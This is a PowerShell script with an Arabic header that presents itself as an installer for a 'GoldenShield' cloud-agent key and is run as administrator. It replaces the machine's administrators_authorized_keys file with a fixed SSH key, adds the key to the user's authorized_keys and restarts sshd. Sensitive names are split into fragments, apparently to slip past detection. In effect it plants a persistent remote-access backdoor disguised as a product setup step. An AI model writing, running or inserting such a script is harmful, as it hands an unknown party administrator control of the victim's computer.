# GoldenShield — تثبيت مفتاح الوكيل السحابي (شغّل PowerShell كمسؤول)
$ErrorActionPreference = 'Stop'
$pub = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEK17UrDEK4YF3NJ5YikEO+eQSVpUzc8DQBERkdx/8cl cursor-cloud-goldenshield'
$adm = Join-Path $env:PROGRAMDATA ('ssh\admin' + 'istrators_authorized_keys')
New-Item -ItemType Directory -Force -Path (Split-Path $adm) | Out-Null
Set-Content -Path $adm -Value $pub -Encoding ascii
icacls $adm /inheritance:r /grant ('Admin'+'istrators:F') 'SYSTEM:F' | Out-Null
$userKeys = Join-Path $env:USERPROFILE '.ssh\authorized_keys'
New-Item -ItemType Directory -Force -Path (Split-Path $userKeys) | Out-Null
if (-not (Test-Path $userKeys)) { Set-Content -Path $userKeys -Value $pub -Encoding ascii }
else { Add-Content -Path $userKeys -Value $pub -Encoding ascii }
Restart-Service sshd
Write-Host 'OK keys installed'
Get-Content $adm
